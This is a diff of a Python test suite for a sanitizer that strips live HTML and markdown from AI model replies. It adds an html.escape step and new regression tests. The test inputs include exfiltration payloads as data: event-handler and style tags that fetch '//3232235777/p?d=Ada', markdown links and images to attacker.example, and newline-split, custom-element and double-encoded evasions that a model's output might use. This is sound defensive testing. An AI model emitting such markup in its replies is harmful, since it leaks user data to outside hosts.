@@ -2591,18 +2591,51 @@ class SanitizeReplyTests(TestCase):
         self.assertIn("        return 1", out)
 
     # --- fidelity: ordinary text must survive intact ---------------------------
+    #
+    # ROUND-5 CONTRACT CHANGE (deliberate, user-approved — NOT a weakening).
+    # _sanitize_reply now ends with html.escape(..., quote=False), so any
+    # angle bracket that survives the matchers arrives as an entity. These
+    # assertions therefore pin the ESCAPED form instead of byte-identity.
+    # The text itself is still fully preserved — nothing is deleted, and in a
+    # markdown/HTML client `&lt;` renders back to `<`, which is strictly
+    # better than the old behaviour where `a<b and b>c` handed the client a
+    # live (inert) <b> tag and the rest of the line rendered bold. Prose with
+    # no `<`, `>` or `&` in it is still byte-identical — see
+    # test_ordinary_prose_without_markup_characters_is_byte_identical.
 
-    def test_angle_bracket_comparison_survives_intact(self):
-        text = "if a<b and b>c: pass"
-        self.assertEqual(self._clean(text), text)
+    def test_angle_bracket_comparison_survives_escaped(self):
+        self.assertEqual(self._clean("if a<b and b>c: pass"),
+                         "if a&lt;b and b&gt;c: pass")
 
-    def test_generic_type_syntax_survives_intact(self):
-        text = "List<int> x; Map<String, Integer> y;"
-        self.assertEqual(self._clean(text), text)
+    def test_generic_type_syntax_survives_escaped(self):
+        self.assertEqual(self._clean("List<int> x; Map<String, Integer> y;"),
+                         "List&lt;int&gt; x; Map&lt;String, Integer&gt; y;")
 
-    def test_prose_discussing_html_tags_survives_intact(self):
-        text = "Use the <div> element and <span> inline."
-        self.assertEqual(self._clean(text), text)
+    def test_prose_discussing_html_tags_survives_escaped(self):
+        self.assertEqual(self._clean("Use the <div> element and <span> inline."),
+                         "Use the &lt;div&gt; element and &lt;span&gt; inline.")
+
+    def test_ordinary_prose_without_markup_characters_is_byte_identical(self):
+        """The escape step only touches `&`, `<` and `>`. Prose carrying none
+        of them must come through untouched, character for character."""
+        for text in [
+            "Acme Inc. is hiring three Python engineers.",
+            "Reach the team at ada@example.com any weekday.",
+            "Available 2024//2025",
+            "Salary band: 90k-120k (plus equity).",
+            "Ada's CV lists Django, Postgres and Celery.",
+            'She said "great fit" twice.',
+            "Sure, here you go:\n\n    def foo():\n        return 1\n",
+        ]:
+            with self.subTest(text=text):
+                self.assertEqual(self._clean(text), text.strip())
+
+    def test_ampersand_in_prose_is_escaped(self):
+        """Pinning the one visible cost of the escape step so it is a
+        recorded contract rather than a surprise: `&` becomes `&amp;`, which
+        a markdown/HTML client renders back as `&`."""
+        self.assertEqual(self._clean("R&D and Q&A both report to Ada"),
+                         "R&amp;D and Q&amp;A both report to Ada")
 
     # --- prose that merely contains "//" must survive intact -------------------
 
@@ -2624,17 +2657,18 @@ class SanitizeReplyTests(TestCase):
 
     # --- fidelity: round-3 additions --------------------------------------------
 
-    def test_cpp_template_syntax_survives_intact(self):
-        text = "std::vector<std::string> v;"
-        self.assertEqual(self._clean(text), text)
+    def test_cpp_template_syntax_survives_escaped(self):
+        self.assertEqual(self._clean("std::vector<std::string> v;"),
+                         "std::vector&lt;std::string&gt; v;")
 
-    def test_arrow_function_with_comparisons_survives_intact(self):
+    def test_arrow_function_with_comparisons_survives_escaped(self):
         """Contains both "=" and "<"/">" near each other, but never in the
         <name ...=...> shape the attribute-assignment matcher looks for —
         the only "<" is immediately followed by a digit, which can never
-        start a tag name."""
-        text = "const f = (a) => a<10 && a>1;"
-        self.assertEqual(self._clean(text), text)
+        start a tag name. Nothing is deleted; the brackets and the "&&" are
+        entity-escaped by the round-5 final step."""
+        self.assertEqual(self._clean("const f = (a) => a<10 && a>1;"),
+                         "const f = (a) =&gt; a&lt;10 &amp;&amp; a&gt;1;")
 
     # --- N1: an expanded tag name list plus a generic attribute-bearing ---------
     # --- catch-all, not URL-matcher awareness of exotic host forms --------------
@@ -2738,10 +2772,15 @@ class SanitizeReplyTests(TestCase):
         """Round-trip the sanitized text through a REAL HTML tokenizer.
 
         String matching only proves our own regexes agree with themselves.
-        html.parser is what tells us whether a browser would still see a
-        fetch-capable element: `<img/src=x>` contains no space, so the
-        pre-fix `\\s`-anchored matcher left it alone, yet html.parser reports
+        html.parser is what tells us whether a browser would still see an
+        element: `<img/src=x>` contains no space, so the round-3
+        `\\s`-anchored matcher left it alone, yet html.parser reports
         tag='img' attrs=[('src', 'x')] for it — a live beacon.
+
+        Since round 5 ends the pipeline with html.escape, the bar is now NO
+        ELEMENT AT ALL rather than "no element carrying attributes": the
+        residual `</div>` shapes earlier rounds tolerated as cosmetic are
+        `&lt;/div&gt;` now, so the tokenizer sees plain text.
         """
         from html.parser import HTMLParser
 
@@ -2749,16 +2788,17 @@ class SanitizeReplyTests(TestCase):
 
         class _Collect(HTMLParser):
             def handle_starttag(self, tag, attrs):
-                found.append((tag, attrs))
+                found.append(("start", tag, attrs))
 
             handle_startendtag = handle_starttag
+
+            def handle_endtag(self, tag):
+                found.append(("end", tag, []))
 
         parser = _Collect()
         parser.feed(out)
         parser.close()
-        live = [(tag, attrs) for tag, attrs in found if attrs]
-        self.assertEqual(live, [], f"fetch-capable markup survived in {out!r}")
-        self.assertNotIn("3232235777", out)
+        self.assertEqual(found, [], f"markup survived in {out!r}")
 
     def test_solidus_separated_attributes_are_stripped(self):
         """HTML5's tokenizer treats "/" inside a tag as an attribute
@@ -2790,6 +2830,7 @@ class SanitizeReplyTests(TestCase):
         out = self._clean(
             "<div/onmouseover=\"fetch('//3232235777/p?d=Ada')\">x</div>")
         self.assertIn("x", out)
+        self.assertNotIn("3232235777", out)
         self._assert_no_live_markup(out)
 
     # --- R2: the pass bound must fail CLOSED, not open --------------------------
@@ -2837,32 +2878,42 @@ class SanitizeReplyTests(TestCase):
 
     # --- R3: generic default parameters are not HTML attributes -----------------
 
-    def test_generic_default_parameters_survive_intact(self):
+    def test_generic_default_parameters_survive_escaped(self):
         """`<typename T = int>` has an "=" between "<" and ">" but is not a
         tag: real attribute assignments bind their name tightly (`src=`,
         `onmouseover=`), while a generic default is a spaced ` = ` after a
-        type parameter."""
-        for text in [
-            "template <typename T = int> class Foo;",
-            "template<int N = 4> struct S;",
-            "function f<T = string>(x: T) { return x; }",
-            "struct Foo<T = u32>;",
+        type parameter. Round-3 DELETED the whole span; round 4 stopped
+        deleting it; round 5 additionally escapes the brackets (see the
+        contract note above) — the type parameter itself is intact either
+        way."""
+        for text, expected in [
+            ("template <typename T = int> class Foo;",
+             "template &lt;typename T = int&gt; class Foo;"),
+            ("template<int N = 4> struct S;",
+             "template&lt;int N = 4&gt; struct S;"),
+            ("function f<T = string>(x: T) { return x; }",
+             "function f&lt;T = string&gt;(x: T) { return x; }"),
+            ("struct Foo<T = u32>;", "struct Foo&lt;T = u32&gt;;"),
         ]:
             with self.subTest(text=text):
-                self.assertEqual(self._clean(text), text)
+                self.assertEqual(self._clean(text), expected)
 
     def test_comparison_prose_with_an_equals_between_the_brackets_survives(self):
-        text = "Trigger it if x<y and z=1 then w>0 holds."
-        self.assertEqual(self._clean(text), text)
+        self.assertEqual(
+            self._clean("Trigger it if x<y and z=1 then w>0 holds."),
+            "Trigger it if x&lt;y and z=1 then w&gt;0 holds.")
 
     def test_multi_line_prose_is_never_swallowed_by_one_stray_bracket(self):
         """The worst of the round-3 over-matches: `[^<>]*` matched newlines,
         so a single `<word ` could eat an unbounded multi-line span up to the
         next ">" whenever an "=" fell in between — this three-line reply
-        collapsed to "Use ad."."""
-        text = ("Use a<b for the check\nand set flag=1 when done\n"
-                "so that c>d.")
-        self.assertEqual(self._clean(text), text)
+        collapsed to "Use ad.". All three lines must survive; round 5 escapes
+        their brackets but deletes nothing."""
+        self.assertEqual(
+            self._clean("Use a<b for the check\nand set flag=1 when done\n"
+                        "so that c>d."),
+            "Use a&lt;b for the check\nand set flag=1 when done\n"
+            "so that c&gt;d.")
 
     # --- R3 guard: the tightened branch must still catch real payloads ----------
 
@@ -2882,4 +2933,105 @@ class SanitizeReplyTests(TestCase):
             with self.subTest(raw=raw):
                 out = self._clean(raw)
                 self.assertIn("x", out)
+                self.assertNotIn("3232235777", out)
                 self._assert_no_live_markup(out)
+
+    # --- R5: escaping ends the arms race ----------------------------------------
+    #
+    # Rounds 1-4 each closed a tag shape and each time the next review found
+    # another one. These are the shapes still live entering round 5, all
+    # verified as fetch-capable elements by round-tripping the round-4
+    # sanitizer's OUTPUT through html.parser. None of them is fixed by a new
+    # regex: they are fixed by html.escape running last, which is why the
+    # assertion is "the tokenizer sees no element", not "some pattern is
+    # absent".
+
+    def test_newline_attribute_separators_are_neutralised(self):
+        """A newline is a legal attribute separator ANYWHERE inside a tag —
+        before the "=", after it, between attributes, inside a quoted value,
+        even splitting an attribute name in two. Round 4 banned newlines from
+        the unlisted-name branch's body to stop it swallowing multi-line
+        prose, and that ban is exactly what these nine walk through. Each one
+        was a live element in round 4:
+
+            '<div style\\n="background:url(//3232235777/p?d=Ada)">x</div>'
+              -> unchanged; html.parser: div style='background:url(//...)'
+        """
+        beacon = "//3232235777/p?d=Ada"
+        for raw in [
+            f'<div style\n="background:url({beacon})">x</div>',
+            f'<div onmouseover\n=\n"fetch(\'{beacon}\')">x</div>',
+            f'<table background\n="{beacon}">x',
+            f'<td background\n="{beacon}">x',
+            f'<div onmouseover\t\n= "fetch(\'{beacon}\')">x</div>',
+            f'<div onmouseover="fetch(\n\'{beacon}\')">x</div>',
+            f'<span data\n = "{beacon}" onclick="f()">x</span>',
+            f'<section back\nground="{beacon}">x</section>',
+            f'<div onmouseover="fetch(\'{beacon}\')"\n>x</div>',
+        ]:
+            with self.subTest(raw=raw):
+                out = self._clean(raw)
+                self.assertIn("x", out)
+                self._assert_no_live_markup(out)
+
+    def test_hyphenated_custom_element_names_are_neutralised(self):
+        """Branch B's name class is `[a-zA-Z][a-zA-Z0-9]*`, which cannot
+        express a custom element. Browsers happily run an event handler on
+        one. Pre-existing since round 3; free to close now."""
+        beacon = "//3232235777/p?d=Ada"
+        for raw in [
+            f'<my-el onmouseover="fetch(\'{beacon}\')">x</my-el>',
+            f'<my-el\nonmouseover\n="fetch(\'{beacon}\')">x</my-el>',
+            f'<x-y data\n="{beacon}">x</x-y>',
+        ]:
+            with self.subTest(raw=raw):
+                out = self._clean(raw)
+                self.assertIn("x", out)
+                self._assert_no_live_markup(out)
+
+    def test_angle_bracket_inside_a_quoted_attribute_value_is_neutralised(self):
+        """`[^<>\\n]*` stops dead at the "<" inside the handler body, so the
+        matcher never reaches the closing ">" and the whole tag survived.
+        Quoting rules are a tokenizer's job, not a regex's."""
+        out = self._clean(
+            '<div onmouseover="if(a<b)fetch(\'//3232235777/p?d=Ada\')">x</div>')
+        self.assertIn("x", out)
+        self._assert_no_live_markup(out)
+
+    def test_sanitizing_twice_equals_sanitizing_once(self):
+        """The leading html.unescape undoes the trailing html.escape, so the
+        function is a fixed point after one application. Worth pinning: a
+        reply that is re-sanitized (replayed from a checkpoint, re-rendered,
+        passed through a second layer) must not accumulate `&amp;amp;`."""
+        beacon = "//3232235777/p?d=Ada"
+        corpus = [
+            "",
+            "Plain reply with no markup at all.",
+            "if a<b and b>c: pass",
+            "R&D and Q&A both report to Ada",
+            "template <typename T = int> class Foo;",
+            f'<img src="{beacon}">',
+            f'<div style\n="background:url({beacon})">x</div>',
+            f'<my-el onmouseover="fetch(\'{beacon}\')">x</my-el>',
+            "See [this role](https://attacker.example/x) or www.attacker.example/p",
+            "Good fit! ![](https://attacker.example/p?d=Ada)",
+            "&lt;img src=x&gt;",
+            "Sure:\n\n    def foo():\n        return 1\n",
+        ]
+        for text in corpus:
+            with self.subTest(text=text):
+                once = self._clean(text)
+                self.assertEqual(self._clean(once), once)
+
+    def test_double_encoded_markup_never_decodes_into_markup(self):
+        """`&amp;lt;img src=x&amp;gt;` is what a model emits when it wants a
+        client that decodes once to see `&lt;img src=x&gt;` — and a client
+        that decodes twice to see a live tag. One decode of our output must
+        yield inert text, never markup."""
+        import html as _html
+
+        out = self._clean("&amp;lt;img src=x&amp;gt; is how you write it")
+        self.assertEqual(out, "&amp;lt;img src=x&amp;gt; is how you write it")
+        decoded_once = _html.unescape(out)
+        self.assertEqual(decoded_once, "&lt;img src=x&gt; is how you write it")
+        self._assert_no_live_markup(decoded_once)
